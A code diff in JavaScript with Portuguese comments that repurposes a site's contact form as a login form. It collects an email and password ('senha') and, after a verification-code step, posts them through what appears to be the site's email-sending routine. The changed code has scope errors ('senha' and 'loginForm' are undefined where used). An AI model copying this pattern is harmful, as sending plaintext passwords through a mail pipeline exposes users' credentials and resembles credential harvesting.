@@ -70,19 +70,19 @@ const observer = new IntersectionObserver((entries) => {
 // SISTEMA DE ENVIO DE EMAIL PARA ATUALIZAR A PÁGINA
 
 document.addEventListener('DOMContentLoaded', () => {
-    const contactForm = document.getElementById('contactForm');
-    const verificationForm = document.getElementById('verificationForm');
+    const contactForm = document.getElementById('loginForm');
+    const verificationLogin = document.getElementById('verificationLogin');
 
     // Inicialmente esconde o formulário de verificação
-    verificationForm.style.display = 'none';
+    verificationLogin.style.display = 'none';
 
     // Submeter formulário de contato
     contactForm.addEventListener('submit', async (e) => {
         e.preventDefault();
         
-        const name = document.getElementById('name').value;
+        
         const email = document.getElementById('email').value;
-        const message = document.getElementById('message').value;
+        const senha = document.getElementById('senha').value;
         
 
         try {
@@ -99,8 +99,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
             if (response.ok) {
                 // Esconde o formulário de contato e exibe o de verificação
-                contactForm.style.display = 'none';
-                verificationForm.style.display = 'block';
+                loginForm.style.display = 'none';
+                verificationLogin.style.display = 'block';
             } else {
                 alert(result.message);
             }
@@ -110,12 +110,11 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Submeter formulário de verificação
-    verificationForm.addEventListener('submit', async (e) => {
+    verificationLogin.addEventListener('submit', async (e) => {
         e.preventDefault();
         
         const email = document.getElementById('email').value; // Email original
         const code = document.getElementById('verificationCode').value;
-        const message = document.getElementById('message').value;
 
         try {
             const response = await fetch('/verify-code', {
@@ -135,7 +134,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ name, email, message })
+                    body: JSON.stringify({senha, email })
                 });
                 alert('Mensagem enviada com sucesso!');
                 window.location.reload();
